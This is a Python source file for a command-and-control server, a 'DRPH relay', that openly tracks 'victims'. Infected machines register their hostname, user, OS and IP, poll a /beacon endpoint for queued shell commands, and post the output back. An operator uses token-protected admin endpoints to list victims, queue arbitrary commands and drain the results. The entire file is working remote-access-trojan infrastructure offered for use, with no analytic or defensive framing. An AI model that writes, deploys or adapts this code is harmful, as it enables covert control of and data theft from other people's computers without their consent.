# language: python, file: server.py, target: py3.8+, any OS
# DRPH relay v6 — replaces cloudflared. victims poll /beacon, admin drives /admin/*.
import os, sys, json, base64, secrets, time, threading, argparse
import http.server, urllib.parse

VERSION = "6.0"
TOKEN = None
ADMIN = None
VICTIMS = {}          # vid -> dict
QUEUES  = {}          # vid -> [ {id, cmd} ]
RESULTS = {}          # vid -> [ {id, cmd, out, cwd, ts} ]
LOCK = threading.Lock()

def _json(h, obj, code=200):
    body = json.dumps(obj).encode()
    h.send_response(code)
    h.send_header("Content-Type", "application/json")
    h.send_header("Content-Length", str(len(body)))
    h.send_header("Access-Control-Allow-Origin", "*")
    h.end_headers()
    try: h.wfile.write(body)
    except Exception: pass

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def _body(self):
        n = int(self.headers.get("Content-Length", "0") or "0")
        try: return json.loads(self.rfile.read(n).decode() or "{}")
        except Exception: return {}

    def _is_admin(self):
        return self.headers.get("X-DRPH-Admin", "") == ADMIN

    def _is_victim(self):
        return self.headers.get("X-DRPH-Token", "") == TOKEN

    # ---------- victim-facing ----------
    def do_POST(self):
        p = self.path.split("?",1)[0]

        if p == "/announce":
            if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
            b = self._body(); vid = b.get("vid") or "?"
            with LOCK:
                VICTIMS[vid] = {k: b.get(k) for k in
                    ("hostname","user","os","machine","python","cwd","port","url")}
                VICTIMS[vid]["last_seen"] = time.time()
                VICTIMS[vid]["ip"] = self.client_address[0]
            return _json(self, {"ok": True, "vid": vid})

        if p == "/beacon":
            if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
            b = self._body(); vid = b.get("vid") or "?"
            with LOCK:
                v = VICTIMS.setdefault(vid, {})
                for k in ("hostname","user","os","machine","python","cwd","port","url"):
                    if b.get(k) is not None: v[k] = b[k]
                v["last_seen"] = time.time()
                v.setdefault("ip", self.client_address[0])
                q = QUEUES.setdefault(vid, [])
                if q:
                    item = q.pop(0)
                    return _json(self, {"op":"cmd", "id":item["id"], "cmd":item["cmd"]})
            return _json(self, {"op":"wait", "sec": 3})

        if p == "/result":
            if not self._is_victim(): return _json(self, {"err":"auth"}, 403)
            b = self._body(); vid = b.get("vid") or "?"
            with LOCK:
                RESULTS.setdefault(vid, []).append({
                    "id": b.get("id"),
                    "cmd": b.get("cmd",""),
                    "out": b.get("out",""),
                    "cwd": b.get("cwd",""),
                    "ts": time.time()})
                VICTIMS.setdefault(vid, {})["last_seen"] = time.time()
            return _json(self, {"ok": True})

        # ---------- admin-facing ----------
        if p == "/admin/queue":
            if not self._is_admin(): return _json(self, {"err":"auth"}, 403)
            b = self._body()
            vid, cmd = b.get("vid"), b.get("cmd")
            if not vid or not cmd: return _json(self, {"err":"vid+cmd"}, 400)
            cid = secrets.token_hex(6)
            with LOCK:
                QUEUES.setdefault(vid, []).append({"id": cid, "cmd": cmd})
            return _json(self, {"ok": True, "id": cid})

        if p == "/admin/put_cfg":
            # compat shim: payload side still uses __put__ drph.cfg — kept for repoint
            if not self._is_admin(): return _json(self, {"err":"auth"}, 403)
            return _json(self, {"ok": True})

        return _json(self, {"err":"not found"}, 404)

    def do_GET(self):
        p = self.path.split("?",1)[0]
        qs = self.path.split("?",1)[1] if "?" in self.path else ""
        q = dict(urllib.parse.parse_qsl(qs))

        if p == "/ping": return _json(self, {"ok": True, "v": VERSION})

        if not self._is_admin():
            return _json(self, {"err":"auth"}, 403)

        if p == "/admin/victims":
            now = time.time()
            with LOCK:
                rows = []
                for vid, v in VICTIMS.items():
                    rows.append({**v, "vid": vid,
                                 "age": round(now - v.get("last_seen", now), 1),
                                 "queued": len(QUEUES.get(vid, [])),
                                 "results": len(RESULTS.get(vid, []))})
            return _json(self, {"ok": True, "victims": rows})

        if p == "/admin/results":
            vid = q.get("vid")
            if not vid: return _json(self, {"err":"vid"}, 400)
            drain = q.get("drain", "1") == "1"
            with LOCK:
                r = RESULTS.get(vid, [])
                if drain: RESULTS[vid] = []
            return _json(self, {"ok": True, "results": r})

        if p == "/admin/result_by_id":
            vid = q.get("vid"); rid = q.get("id")
            if not vid or not rid: return _json(self, {"err":"vid+id"}, 400)
            deadline = time.time() + float(q.get("timeout","30"))
            while time.time() < deadline:
                with LOCK:
                    for r in RESULTS.get(vid, []):
                        if r.get("id") == rid:
                            RESULTS[vid] = [x for x in RESULTS[vid] if x.get("id") != rid]
                            return _json(self, {"ok": True, "result": r})
                time.sleep(0.1)
            return _json(self, {"ok": False, "err":"timeout"}, 504)

        return _json(self, {"err":"not found"}, 404)

def serve(host, port):
    srv = http.server.ThreadingHTTPServer((host, port), H)
    srv.daemon_threads = True
    print(f"[+] listening {host}:{port}")
    print(f"[+] token  {TOKEN}")
    print(f"[+] admin  {ADMIN}")
    try: srv.serve_forever()
    except KeyboardInterrupt: pass

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--token", default=None)
    ap.add_argument("--admin", default=None)
    a = ap.parse_args()
    TOKEN = a.token or secrets.token_hex(16)
    ADMIN = a.admin or secrets.token_hex(16)
    serve(a.host, a.port)
